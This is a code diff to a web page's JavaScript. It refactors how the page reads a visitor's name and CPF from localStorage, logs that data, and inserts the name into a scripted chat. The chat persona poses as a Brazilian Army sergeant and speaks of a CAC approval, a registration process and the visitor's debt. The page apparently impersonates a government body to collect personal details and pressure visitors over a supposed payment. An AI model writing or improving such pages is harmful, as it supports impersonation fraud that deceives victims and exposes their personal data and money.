@@ -337,9 +337,6 @@
     </main>
 
 <script>
-// Get customer data from localStorage (saved when accessing via CPF slug)
-const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
-
 // Function to properly capitalize names
 function capitalizeNames(name) {
     if (!name) return 'Nome não informado';
@@ -348,14 +345,55 @@ function capitalizeNames(name) {
     ).join(' ');
 }
 
-const firstName = customerData.nome ? capitalizeNames(customerData.nome.split(' ')[0]) : 'Candidato';
-const fullName = customerData.nome ? capitalizeNames(customerData.nome) : 'Nome não informado';
-const cpf = customerData.cpf || 'CPF não informado';
+// Function to get user name from localStorage (checking multiple possible keys)
+function getUserName() {
+    const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+    
+    // Try different possible keys for the name
+    const name = customerData.nome || 
+                 customerData.full_name || 
+                 localStorage.getItem('full_name') || 
+                 localStorage.getItem('nome') || 
+                 localStorage.getItem('name') || 
+                 '';
+    
+    console.log('Dados do usuário encontrados:', customerData);
+    console.log('Nome extraído:', name);
+    
+    return name;
+}
+
+// Function to get first name
+function getFirstName() {
+    const fullName = getUserName();
+    if (!fullName || fullName === 'Nome não informado') {
+        return 'Candidato';
+    }
+    return capitalizeNames(fullName.split(' ')[0]);
+}
+
+// Function to get full name
+function getFullName() {
+    const fullName = getUserName();
+    return fullName ? capitalizeNames(fullName) : 'Nome não informado';
+}
+
+// Function to get CPF
+function getUserCPF() {
+    const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+    return customerData.cpf || localStorage.getItem('cpf') || 'CPF não informado';
+}
+
+// Get customer data from localStorage (saved when accessing via CPF slug)
+const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+const firstName = getFirstName();
+const fullName = getFullName();
+const cpf = getUserCPF();
 
 // Chat sequence with CAC approval notification
 const chatSequence = [
     {
-        message: `Olá ${firstName}, aqui é o Sargento Franklin Ribeiro, do Exército Brasileiro. Estou aqui para ajudá-lo a finalizar seu processo de cadastro.`,
+        message: `Olá ${getFirstName()}, aqui é o Sargento Franklin Ribeiro, do Exército Brasileiro. Estou aqui para ajudá-lo a finalizar seu processo de cadastro.`,
         delay: 3000
     },
     {
@@ -978,7 +1016,7 @@ async function confirmPhone() {
 
     // Show typing and thank message
     await showTyping(3000);
-    addMessage(`Obrigada, ${firstName}! Telefone confirmado. Agora vou prosseguir com as informações sobre seu débito.`, true, true);
+    addMessage(`Obrigada, ${getFirstName()}! Telefone confirmado. Agora vou prosseguir com as informações sobre seu débito.`, true, true);
 
     // Resolve the promise to continue chat
     if (phoneConfirmationResolve) {
